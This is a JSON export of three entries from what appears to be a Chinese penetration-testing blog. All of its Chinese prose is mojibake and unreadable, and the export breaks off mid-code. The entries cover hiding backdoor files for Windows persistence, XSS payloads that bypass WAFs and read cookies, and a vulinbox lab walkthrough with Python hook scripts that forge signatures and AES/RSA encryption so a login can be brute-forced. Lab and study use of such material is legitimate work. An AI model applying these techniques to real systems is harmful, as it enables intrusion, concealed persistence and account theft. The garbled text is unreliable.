        "summary": "windowsæƒé™ç»´æŒ æœ€ä¸»è¦å°±æ˜¯æƒ³ä¸€äº›åŠæ³•è®©æˆ‘ä»¬çš„åé—¨èƒ½å¤Ÿè‡ªä¸»æ‰§è¡Œä»è€Œè®©æˆ‘ä»¬ä¸€ç›´æ‹¥æœ‰ç›®æ ‡ä¸»æœºçš„æƒé™ï¼Œå¾ˆå¤šæ“ä½œä¹Ÿç±»ä¼¼äºæƒé™æå‡\næ–‡ä»¶ç‰¹æ€§ å’Œlinuxä¸€æ ·ï¼Œæ–‡ä»¶å±‚é¢ä¸Šçœ‹ï¼Œæœ‰ä¸€äº›éšè—æ–‡ä»¶çš„æ–¹æ³•\nattrib attrib +s +a +h +r c:\\test sï¼šè®¾ç½®ç³»ç»Ÿå±æ€§ï¼ˆSystemï¼‰ aï¼šè®¾ç½®å­˜æ¡£å±æ€§ï¼ˆArchiveï¼‰ hï¼šè®¾ç½®éšè—å±æ€§ï¼ˆHiddenï¼‰\nrï¼šè®¾ç½®åªè¯»å±æ€§ï¼ˆRead-onlyï¼‰\nå¦‚æ­¤å³å¯è¿›è¡Œéšè—\nå¦‚æœè¦æŸ¥çœ‹ï¼Œéœ€è¦åŠ ä¸Š/aå‚æ•°ï¼š\ndir /a å½“ç„¶ï¼Œåˆ é™¤å¯¹åº”å±æ€§ä¹Ÿèƒ½é‡æ–°æ˜¾ç¤ºå‡ºæ¥ï¼š\nattrib -s -a -h -r c:\\test ç³»ç»Ÿå›¾æ ‡éšè— å¯ä»¥æŠŠæ–‡ä»¶å¤¹çš„åç§°é‡å‘½åä¸º æˆ‘çš„ç”µè„‘.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\nè¿™æ ·ï¼Œå›¾æ ‡å˜æˆäº†æˆ‘çš„ç”µè„‘ï¼ŒåŒå‡»ä¹Ÿæ˜¯å¯ä»¥åˆ°è¾¾æˆ‘çš„ç”µè„‘ï¼Œä¸èƒ½è¿›å…¥æŸ¥çœ‹æˆ‘ä»¬æ–‡ä»¶å¤¹çš„å†…å®¹\næ­¤æ—¶ï¼Œåªèƒ½ä½¿ç”¨å‘½ä»¤è¡ŒæŸ¥çœ‹å’Œè®¿é—®è¯¥æ–‡ä»¶å¤¹ï¼š\nå¸¸ç”¨çš„åç§°å¦‚ä¸‹ï¼š\næˆ‘çš„ç”µè„‘.{20D04FE0-3AEA-1069-A2D8-08002B30309D} å›æ”¶ç«™.{645ff040-5081-101b-9f08-00aa002f954e} æ‹”å·ç½‘ç»œ.{992CFFA0-F557-101A-88EC-00DD010CCC48} æ‰“å°æœº.{2227a280-3aea-1069-a2de-08002b30309d} æ§åˆ¶é¢æ¿.{21ec2020-3aea-1069-a2dd-08002b30309d} ç½‘ä¸Šé‚»å±….{208D2C60-3AEA-1069-A2D7-08002B30309D} ç•¸å½¢åç§° åˆ›å»ºæ–‡ä»¶åç§°ä¸º test...\\ æ˜¾ç¤ºåç§°æ˜¯ test...\nè¿™ä¸ªæ–‡ä»¶å¯ä»¥çœ‹åˆ°ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®å†…éƒ¨æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½åˆ é™¤\nmd test...\\ copy 1111.txt test...\\ æ­¤æ—¶è¿™ä¸ªæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥çš„åç§°ä¸ºtest\u0026hellip;\nä»¥è¿™ä¸ªåç§°è¿›è¡Œæ–‡ä»¶æ“ä½œå§‹ç»ˆä¼šå¤±è´¥ï¼š\nå‘½ä»¤è¡Œè¿›å…¥å¤±è´¥ï¼š\nç›´æ¥ç‚¹ä¹Ÿç‚¹ä¸å¼€ï¼Œæˆ–è€…ç‚¹å¼€åé‡Œé¢çš„æ–‡ä»¶ä¹Ÿæ— æ³•æ‰“å¼€ï¼š\næ— æ³•ç›´æ¥åˆ é™¤ï¼š\nå¦‚æœæƒ³è¦åˆ é™¤è¯¥æ–‡ä»¶ï¼Œå¯ä»¥å¦‚ä¸‹æ“ä½œï¼š\nrd /s /q c:\\test...\\ /s è¡¨ç¤ºé€’å½’åœ°åˆ é™¤æŒ‡å®šç›®å½•åŠæ‰€æœ‰å­ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚ /q è¡¨ç¤ºå®‰é™æ¨¡å¼ï¼Œå³ä¸æç¤ºç¡®è®¤ç›´æ¥åˆ é™¤ã€‚ "
    }
,
    {
        "title": "XSS_tricks",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/waf%E5%AF%B9%E6%8A%97/xss_tricks/",
        "content": "XSS_tricks è®°å½•ä¸€äº›é€‚ç”¨äºbypass wafçš„XSSå°tricks\nä»¥åŠä¸€äº›ä¸æ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°çš„å¯ä»¥æµ‹è¯•XSSçš„åœºæ™¯\nå·§ç”¨åå¼•å· è¯¥trickæ¥è‡ªäº0xsdeoå¸ˆå‚…çš„Spade secå…¬ä¼—å·\nåå¼•å·å¯ä»¥è¾¾åˆ°ä¸€ä¸ªä¸ç”¨æ‹¬å·çš„æ•ˆæœï¼Œå¾ˆé€‚åˆç”¨äº()æ‹¬å·è¢«è½¬ä¹‰åçš„æƒ…å†µ\næ¯”å¦‚ä¸‹é¢å‡ ä¸ªdemoï¼š\næ§åˆ¶å°è¾“å‡ºï¼š\n\u0026lt;script\u0026gt;console.log`1`;\u0026lt;/script\u0026gt; å¼¹çª—ï¼š\n\u0026lt;script\u0026gt;alert`1`;\u0026lt;/script\u0026gt; åœ¨è¿™é‡Œï¼Œåå¼•å·å¼•èµ·æ¥çš„å†…å®¹å«åšæ¨¡æ¿å­—é¢é‡ï¼Œåˆç§°æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œåœ¨es6ä¸­ä¸€èˆ¬ç”¨æ¥å­—ç¬¦ä¸²æ’å€¼ï¼š\nlet name = \u0026#39;Yuy0ung\u0026#39;; `hello ${name}` æ•ˆæœå¦‚ä¸‹ï¼š\nåœ¨é™¤äº†è¿™ç§ç”¨æ³•å¤–ï¼Œå°±æ˜¯æˆ‘ä»¬payloadçš„ç”¨æ³•äº†ï¼Œå³é…åˆé»˜è®¤æˆ–è‡ªå®šä¹‰æ ‡ç­¾å‡½æ•°\né‚£ä¹ˆï¼Œé™¤äº†å¼¹çª—å’Œæ§åˆ¶å°è¾“å‡ºï¼Œè·å–cookieå°±éœ€è¦å†æ„é€ ä¸€ä¸‹äº†ï¼Œæ€è·¯å’Œä¸Šé¢çš„å­—ç¬¦ä¸²æ’å€¼å¾ˆåƒï¼š\nconsole.log`${document.cookie}` å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªå¤šä½™çš„æ•°ç»„ï¼Œå…·ä½“åŸå› å¯ä»¥æŸ¥é˜…es6æ–‡æ¡£ï¼Œè¿™é‡Œä¸åšèµ˜è¿°\nå½“ç„¶è¿™ä¸ªæ•°ç»„ä¼šå¯¼è‡´æˆ‘ä»¬ä½¿ç”¨aletå¼¹ä¸å‡ºcookieï¼Œæ‰€ä»¥æ¨èä½¿ç”¨console.log\n**æ€»ç»“ï¼š**ä¸Šé¢çš„payloadä¼˜åŠ¿åœ¨äºåå¼•å·ã€$ã€{}ä¸‰ç§ç¬¦å·ä¸å®¹æ˜“è¢«è½¬ä¹‰ï¼Œå·§ç”¨äº†æ¨¡æ¿å­—é¢é‡çš„ç‰¹æ€§\næ–‡ä»¶ä¸Šä¼ XSSçš„content-typeç»•è¿‡ é™¤äº†å¸¸è§„çš„text/htmlçš„content-typeï¼Œè¿˜å¯ä»¥æœ‰ä¸€äº›å…¶ä»–çš„ï¼š\ntext/htm htm/text html/text éƒ½å¯ä»¥è¯•ä¸€è¯•ï¼Œä¸»è¦åŸºäºåç«¯çš„é…ç½®ï¼Œåœ¨æ€è€ƒbypassçš„æ—¶å€™å¯ä»¥ä»è¿™æ–¹é¢è¿›è¡Œæ€è€ƒ\nå¯èƒ½å­˜åœ¨XSSçš„éå¸¸è§„åœºæ™¯ OCRæœåŠ¡å¤„ æ¯”å¦‚æœ‰äº›åŠŸèƒ½ç‚¹æ”¯æŒOCRè¯†åˆ«å‘ç¥¨æ–‡å­—å†…å®¹å¹¶è¾“å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡ä¸ŠPä¸€ä¸ªXSSçš„payloadè¿›è¡Œæµ‹è¯•ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå·§å¦™çš„æ€è·¯\nhiddenæ ‡ç­¾å¤„ F12å…¨å±€æœç´¢hiddenæ ‡ç­¾ï¼Œå¯èƒ½æ‰¾åˆ°ä¸€äº›ä¸æ˜¾ç¤ºä½†æ˜¯å†…å®¹å¯æ§çš„æ ‡ç­¾ï¼Œæ¯”å¦‚ç”¨äºé¡µé¢è·³è½¬åŠŸèƒ½çš„éšè—æ ‡ç­¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªdemoï¼š\nnameæ˜¯ReturnUrlï¼Œè¿™é‡Œå°è¯•ç›´æ¥GETä¼ å‚ï¼š\nå‘ç°valueå¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ é—­åˆï¼š\nå¯ä»¥çœ‹è§æˆåŠŸé—­åˆäº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ç›´æ¥æ‰“XSSï¼š\n",
        "summary": "XSS_tricks è®°å½•ä¸€äº›é€‚ç”¨äºbypass wafçš„XSSå°tricks\nä»¥åŠä¸€äº›ä¸æ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°çš„å¯ä»¥æµ‹è¯•XSSçš„åœºæ™¯\nå·§ç”¨åå¼•å· è¯¥trickæ¥è‡ªäº0xsdeoå¸ˆå‚…çš„Spade secå…¬ä¼—å·\nåå¼•å·å¯ä»¥è¾¾åˆ°ä¸€ä¸ªä¸ç”¨æ‹¬å·çš„æ•ˆæœï¼Œå¾ˆé€‚åˆç”¨äº()æ‹¬å·è¢«è½¬ä¹‰åçš„æƒ…å†µ\næ¯”å¦‚ä¸‹é¢å‡ ä¸ªdemoï¼š\næ§åˆ¶å°è¾“å‡ºï¼š\n\u0026lt;script\u0026gt;console.log`1`;\u0026lt;/script\u0026gt; å¼¹çª—ï¼š\n\u0026lt;script\u0026gt;alert`1`;\u0026lt;/script\u0026gt; åœ¨è¿™é‡Œï¼Œåå¼•å·å¼•èµ·æ¥çš„å†…å®¹å«åšæ¨¡æ¿å­—é¢é‡ï¼Œåˆç§°æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œåœ¨es6ä¸­ä¸€èˆ¬ç”¨æ¥å­—ç¬¦ä¸²æ’å€¼ï¼š\nlet name = \u0026#39;Yuy0ung\u0026#39;; `hello ${name}` æ•ˆæœå¦‚ä¸‹ï¼š\nåœ¨é™¤äº†è¿™ç§ç”¨æ³•å¤–ï¼Œå°±æ˜¯æˆ‘ä»¬payloadçš„ç”¨æ³•äº†ï¼Œå³é…åˆé»˜è®¤æˆ–è‡ªå®šä¹‰æ ‡ç­¾å‡½æ•°\né‚£ä¹ˆï¼Œé™¤äº†å¼¹çª—å’Œæ§åˆ¶å°è¾“å‡ºï¼Œè·å–cookieå°±éœ€è¦å†æ„é€ ä¸€ä¸‹äº†ï¼Œæ€è·¯å’Œä¸Šé¢çš„å­—ç¬¦ä¸²æ’å€¼å¾ˆåƒï¼š\nconsole.log`${document.cookie}` å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªå¤šä½™çš„æ•°ç»„ï¼Œå…·ä½“åŸå› å¯ä»¥æŸ¥é˜…es6æ–‡æ¡£ï¼Œè¿™é‡Œä¸åšèµ˜è¿°\nå½“ç„¶è¿™ä¸ªæ•°ç»„ä¼šå¯¼è‡´æˆ‘ä»¬ä½¿ç”¨aletå¼¹ä¸å‡ºcookieï¼Œæ‰€ä»¥æ¨èä½¿ç”¨console.log\n**æ€»ç»“ï¼š**ä¸Šé¢çš„payloadä¼˜åŠ¿åœ¨äºåå¼•å·ã€$ã€{}ä¸‰ç§ç¬¦å·ä¸å®¹æ˜“è¢«è½¬ä¹‰ï¼Œå·§ç”¨äº†æ¨¡æ¿å­—é¢é‡çš„ç‰¹æ€§\næ–‡ä»¶ä¸Šä¼ XSSçš„content-typeç»•è¿‡ é™¤äº†å¸¸è§„çš„text/htmlçš„content-typeï¼Œè¿˜å¯ä»¥æœ‰ä¸€äº›å…¶ä»–çš„ï¼š\ntext/htm htm/text html/text éƒ½å¯ä»¥è¯•ä¸€è¯•ï¼Œä¸»è¦åŸºäºåç«¯çš„é…ç½®ï¼Œåœ¨æ€è€ƒbypassçš„æ—¶å€™å¯ä»¥ä»è¿™æ–¹é¢è¿›è¡Œæ€è€ƒ\nå¯èƒ½å­˜åœ¨XSSçš„éå¸¸è§„åœºæ™¯ OCRæœåŠ¡å¤„ æ¯”å¦‚æœ‰äº›åŠŸèƒ½ç‚¹æ”¯æŒOCRè¯†åˆ«å‘ç¥¨æ–‡å­—å†…å®¹å¹¶è¾“å‡ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨å›¾ç‰‡ä¸ŠPä¸€ä¸ªXSSçš„payloadè¿›è¡Œæµ‹è¯•ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå·§å¦™çš„æ€è·¯\nhiddenæ ‡ç­¾å¤„ F12å…¨å±€æœç´¢hiddenæ ‡ç­¾ï¼Œå¯èƒ½æ‰¾åˆ°ä¸€äº›ä¸æ˜¾ç¤ºä½†æ˜¯å†…å®¹å¯æ§çš„æ ‡ç­¾ï¼Œæ¯”å¦‚ç”¨äºé¡µé¢è·³è½¬åŠŸèƒ½çš„éšè—æ ‡ç­¾ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªdemoï¼š\nnameæ˜¯ReturnUrlï¼Œè¿™é‡Œå°è¯•ç›´æ¥GETä¼ å‚ï¼š\nå‘ç°valueå¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•æ„é€ é—­åˆï¼š\nå¯ä»¥çœ‹è§æˆåŠŸé—­åˆäº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯ç›´æ¥æ‰“XSSï¼š\n"
    }
,
    {
        "title": "yakitå®éªŒå®¤-é«˜çº§å‰ç«¯åŠ è§£å¯†ä¸éªŒç­¾å®æˆ˜é€šå…³è®°å½•",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/js%E5%AF%B9%E6%8A%97/%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/yakit%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E9%AB%98%E7%BA%A7%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B8%8E%E9%AA%8C%E7%AD%BE%E5%AE%9E%E6%88%98%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
        "content": "yakité¶åœº-é«˜çº§å‰ç«¯åŠ è§£å¯†ä¸éªŒç­¾å®æˆ˜ æ„Ÿè°¢kioå¸ˆå‚…æŒ‡è·¯ï¼Œå‘ç°https://vulinbox.bachang.org/#è¿™ä¸ªå®è—é¶åœºï¼Œå½“ç„¶æœ‰yakitä¹Ÿå¯ä»¥åœ¨æœ¬åœ°æ­å»º\nè¿™é‡Œé»˜è®¤è¯»è€…å·²ç»æ‹¥æœ‰jsé€†å‘åŸºç¡€ï¼Œä¸ä¼šç»†è®²ä¸€äº›çŸ¥è¯†ç‚¹äº†ï¼Œæ›´å¤šæ˜¯è¿‡ç¨‹ä½“ç°ï¼Œä»¥åŠå¦‚ä½•é…åˆgalaxyå®ç°è‡ªåŠ¨çš„åŠ è§£å¯†\ngalaxyçš„åŸºç¡€ä½¿ç”¨å¯ä»¥çœ‹æˆ‘è¿™ç¯‡æ–‡ç« ï¼šç½‘ç«™æµé‡åŠ è§£å¯†åœºæ™¯å…¥é—¨\u0026amp;Galaxyä½¿ç”¨\næ–‡ä¸­æˆ‘ç¼–å†™çš„çš„http hookå·²ç»æ‰“åŒ…ä¸Šä¼ è‡³æˆ‘çš„githubï¼šhttps://github.com/Yuy0ung/galaxy_HttpHook_for_yakit-vulinboxï¼Œéœ€è¦å¯ä»¥è‡ªå–\nå‰ç«¯ç­¾åHMAC-SHA256 é¦–å…ˆåˆ†æè¡¨å•æ•°æ®åˆ¤æ–­ï¼Œå‰ç«¯æ˜¯åšäº†ç­¾åçš„ï¼š\nç­¾ååçš„æ•°æ®åŒ…ï¼š jsä¸­å®šä½ä¸€ä¸‹åŠ è§£å¯†ä»£ç å—ï¼š å¾ˆè´´å¿ƒï¼Œæ³¨é‡Šéƒ½å†™å¥½äº†ï¼Œç®€å•åˆ†æä¸€ä¸‹\nfunction outputObj(jsonData) { const word = `username=${jsonData.username}\u0026amp;password=${jsonData.password}`;; return { \u0026#34;signature\u0026#34;: Encrypt(word), \u0026#34;key\u0026#34;: key.toString(), username: jsonData.username, password: jsonData.password, } } ä»è¿™æ®µä»£ç å¯ä»¥åˆ†æå‡ºï¼Œç­¾åæ˜¯å°†æˆ‘ä»¬ä¼ å…¥çš„\tusername=admin\u0026amp;password=123456è¿›è¡Œäº†hmac_sha256åŠ å¯†ï¼Œè€Œå¯†é’¥å°±æ˜¯å°†1234123412341234è½¬16è¿›åˆ¶å³31323334313233343132333431323334\nå€¼å¾—ä¸€æçš„æ˜¯CryptoJS çš„ key åœ¨æ²¡æœ‰æ˜ç¡®æŒ‡å®šç¼–ç æ–¹å¼çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤çš„ toString æ–¹æ³•å°†è¾“å‡ºåå…­è¿›åˆ¶ (Hex) æ ¼å¼çš„å­—ç¬¦ä¸²\nå½“ç„¶CryptoJSè¿˜æœ‰å…¶ä»–å¾ˆå¤šç¼–ç å™¨ï¼Œåœ¨è¿›è¡Œjsåˆ†ææ—¶å€™ï¼Œéœ€è¦æ³¨æ„ç¼–ç æƒ…å†µï¼Œä¸ç„¶ä¼šæµªè´¹å¤§é‡ä¸å¿…è¦çš„æ—¶é—´\næˆ‘ä»¬å¯ä»¥è‡ªè¡ŒåŠ å¯†éªŒè¯ä¸€ä¸‹ï¼š\nç­¾åç¡®å®å’ŒåŠ å¯†åçš„è¡¨å•ä¸€è‡´\né‚£ä¹ˆæ¥ä¸‹æ¥å†™ä¸ªhttp hookï¼š\nimport json import hmac import hashlib import typing as t from fastapi import FastAPI from _base_classes import * SECRET_KEY = b\u0026#34;1234123412341234\u0026#34; # å›ºå®šHMAC keyï¼ˆ16å­—èŠ‚ï¼‰ KEY_STR = SECRET_KEY.hex() # å‘é€åˆ°æœåŠ¡å™¨æ—¶ä½œä¸ºkeyå­—æ®µ app = FastAPI() @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼Œè§£å¯†ï¼Œæ–¹ä¾¿Burpçœ‹åˆ°æ˜æ–‡\u0026#34;\u0026#34;\u0026#34; # è·å–åŸå§‹æ•°æ® content_dict = json.loads(request.content) # ç§»é™¤ç­¾åä¸key content_dict.pop(\u0026#34;signature\u0026#34;, None) content_dict.pop(\u0026#34;key\u0026#34;, None) # è½¬å›å­—èŠ‚æµ request.content = json.dumps(content_dict).encode() return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼ŒåŠ å¯†ï¼ŒåŠ ä¸ŠHMACç­¾å\u0026#34;\u0026#34;\u0026#34; # è§£æåŸå§‹æ•°æ® content_dict = json.loads(request.content) # æ„é€ å¾…ç­¾åå­—ç¬¦ä¸²ï¼ˆå¦‚ username=admin\u0026amp;password=123456ï¼‰ sign_str = \u0026#34;\u0026amp;\u0026#34;.join(f\u0026#34;{k}={v}\u0026#34; for k, v in content_dict.items()) signature = hmac_sha256(sign_str.encode(), SECRET_KEY) # æ„é€ æ–°ç»“æ„ content_dict[\u0026#34;signature\u0026#34;] = signature content_dict[\u0026#34;key\u0026#34;] = KEY_STR request.content = json.dumps(content_dict).encode() return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): \u0026#34;\u0026#34;\u0026#34;Server -\u0026gt; Burpï¼Œä¸æ¶‰åŠè§£å¯†ï¼Œç›´æ¥é€ä¼ \u0026#34;\u0026#34;\u0026#34; return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Clientï¼Œä¸æ¶‰åŠåŠ å¯†ï¼Œç›´æ¥é€ä¼ \u0026#34;\u0026#34;\u0026#34; return response def hmac_sha256(data: bytes, key: bytes) -\u0026gt; str: mac = hmac.new(key, data, hashlib.sha256) return mac.hexdigest() if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) è¿è¡Œhookï¼š\nçœ‹åˆ°hookæ­£åœ¨ç›‘å¬8003ç«¯å£ï¼Œæ¥ä¸‹æ¥burpä¸Šé…ç½®å¹¶å¯åŠ¨hookï¼š\nå¼€å¯hookåå†æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚ä¸­çš„jsonå·²ç»è‡ªåŠ¨è§£å¯†ï¼š å†è¯•è¯•æ”¾åŒ…ï¼š\nç­¾åæ ¡éªŒæˆåŠŸï¼Œè¿™ä»£è¡¨æˆ‘ä»¬çš„hookæ˜¯æ²¡æœ‰é—®é¢˜çš„\nåˆ°è¿™é‡Œè‡ªåŠ¨åŠ è§£å¯†å·²ç»æˆåŠŸå®ç°äº†ï¼Œæ¥ä¸‹æ¥ç›´æ¥çˆ†ç ´ï¼š\nçˆ†ç ´æˆåŠŸï¼Œè´¦æˆ·å¯†ç ä¸ºadmin/admin\nå‰ç«¯ç­¾åHMAC-SHA256+RSA ä¾ç„¶æ˜¯ç­¾å\nå®šä½åˆ°åŠ è§£å¯†ä»£ç ï¼š\nåˆ†æä¸€ä¸‹å¯ä»¥çŸ¥é“ï¼Œsignatureåœ¨åŸæœ¬hmac_sha256çš„åŸºç¡€ä¸Šè¿›è¡Œäº†RSAåŠ å¯†ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½ä¼šå‘serverçš„/crypto/js/rsa/public/keyè·¯ç”±åŠ¨æ€è·å–RSAçš„å…¬é’¥\nå€¼å¾—ä¸€æçš„æ˜¯ï¼š\njsrsasign æ˜¯å‰ç«¯å¸¸ç”¨çš„ RSA åŠ è§£å¯†çš„åº“ï¼Œä¸€èˆ¬è¿™æ ·è°ƒç”¨ï¼š\nKEYUTIL.getKey(publicKey).encrypt(...) ç®€å•æ›´æ”¹ä¸€ä¸‹hookå³å¯:\nimport json import hmac import hashlib import typing as t import requests from fastapi import FastAPI from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from _base_classes import * SECRET_KEY = b\u0026#34;1234123412341234\u0026#34; KEY_STR = SECRET_KEY.hex() RSA_PUBLIC_KEY_URL = \u0026#34;http://127.0.0.1:8787/crypto/js/rsa/public/key\u0026#34; app = FastAPI() @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼Œè§£å¯†\u0026#34;\u0026#34;\u0026#34; content_dict = json.loads(request.content) content_dict.pop(\u0026#34;signature\u0026#34;, None) content_dict.pop(\u0026#34;key\u0026#34;, None) request.content = json.dumps(content_dict).encode() return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼ŒåŠ å¯†ç­¾å + RSA å…¬é’¥åŠ å¯†\u0026#34;\u0026#34;\u0026#34; content_dict = json.loads(request.content) # æ„é€ ç­¾åå­—ç¬¦ä¸² sign_str = \u0026#34;\u0026amp;\u0026#34;.join(f\u0026#34;{k}={v}\u0026#34; for k, v in content_dict.items()) # HMAC-SHA256æ‘˜è¦ hmac_signature = hmac_sha256(sign_str.encode(), SECRET_KEY) # è·å–RSAå…¬é’¥å¹¶åŠ å¯†ç­¾å rsa_pub_pem = fetch_rsa_public_key() encrypted_signature = rsa_encrypt(hmac_signature, rsa_pub_pem) # åŠ å…¥åŠ å¯†ç­¾åä¸keyå­—æ®µ content_dict[\u0026#34;signature\u0026#34;] = encrypted_signature content_dict[\u0026#34;key\u0026#34;] = KEY_STR request.content = json.dumps(content_dict).encode() return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response # --- åŠ å¯†ä¸å·¥å…·å‡½æ•° --- def hmac_sha256(data: bytes, key: bytes) -\u0026gt; str: return hmac.new(key, data, hashlib.sha256).hexdigest() def fetch_rsa_public_key() -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;å‘æœåŠ¡ç«¯è·å–RSAå…¬é’¥ï¼ˆPEMæ ¼å¼ï¼‰\u0026#34;\u0026#34;\u0026#34; try: res = requests.get(RSA_PUBLIC_KEY_URL, timeout=3) res.raise_for_status() return res.text except Exception as e: raise RuntimeError(f\u0026#34;æ— æ³•è·å–RSAå…¬é’¥: {e}\u0026#34;) def rsa_encrypt(data: str, pubkey_pem: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;ä½¿ç”¨RSAå…¬é’¥å¯¹HMACç­¾ååŠ å¯†ï¼Œè¿”å›Base64å­—ç¬¦ä¸²\u0026#34;\u0026#34;\u0026#34; rsa_key = RSA.import_key(pubkey_pem) cipher = PKCS1_v1_5.new(rsa_key) encrypted = cipher.encrypt(data.encode()) return encrypted.hex() if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) ä¾æ—§æŠ“åŒ…æ£€éªŒï¼š å¯ä»¥çœ‹åˆ°è‡ªåŠ¨åŠ è§£å¯†æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´ï¼š\næˆåŠŸçˆ†ç ´ï¼šadmin/admin\nAES-CBCå‰ç«¯åŠ å¯† å¯ä»¥çœ‹åˆ°åŠ å¯†åå·²ç»å®Œå…¨çœ‹ä¸æ‡‚äº†ï¼Œæœ‰dataã€keyã€ivä¸‰ä¸ªå‚æ•°ï¼š å®šä½åˆ°åŠ è§£å¯†ä»£ç ï¼š\nç»åˆ†æå¯ä»¥å¾—å‡ºï¼š\nåŠ å¯†ä¸ºAESé»˜è®¤çš„CBC keyçš„åå…­è¿›åˆ¶ä¸º31323334313233343132333431323334 ivä¸ºéšæœºç”Ÿæˆ è€ŒåŠ è§£å¯†è¿‡ç¨‹å°±æ˜æ˜¾äº†ï¼š åœ¨submiJSONä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯å°†åŸæœ¬è´¦å·å¯†ç çš„jsonç»è¿‡AES-CBCå¤„ç†å˜æˆdataï¼Œå¹¶å’Œkeyã€ivç»„æˆæ–°çš„jsonå‘é€è‡³serverï¼Œé‚£ä¹ˆå†™ä¸€ä¸ªhttp hookï¼š\nimport json import base64 import typing as t import os from fastapi import FastAPI from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from _base_classes import * SECRET_KEY = b\u0026#34;1234123412341234\u0026#34; # 16å­—èŠ‚ key KEY_HEX = SECRET_KEY.hex() app = FastAPI() @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; # è§£æåŠ å¯† JSON encrypted_json = json.loads(request.content) iv_hex = encrypted_json[\u0026#34;iv\u0026#34;] data_b64 = encrypted_json[\u0026#34;data\u0026#34;] # è§£å¯†å†…å®¹ iv = bytes.fromhex(iv_hex) cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(base64.b64decode(data_b64)), AES.block_size) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; raw_json = request.content # æ˜æ–‡ JSONï¼ˆå­—èŠ‚ï¼‰ iv = os.urandom(16) cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(raw_json, AES.block_size)) encrypted_json = { \u0026#34;data\u0026#34;: base64.b64encode(ciphertext).decode(), \u0026#34;key\u0026#34;: KEY_HEX, \u0026#34;iv\u0026#34;: iv.hex() } request.content = json.dumps(encrypted_json).encode() return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def 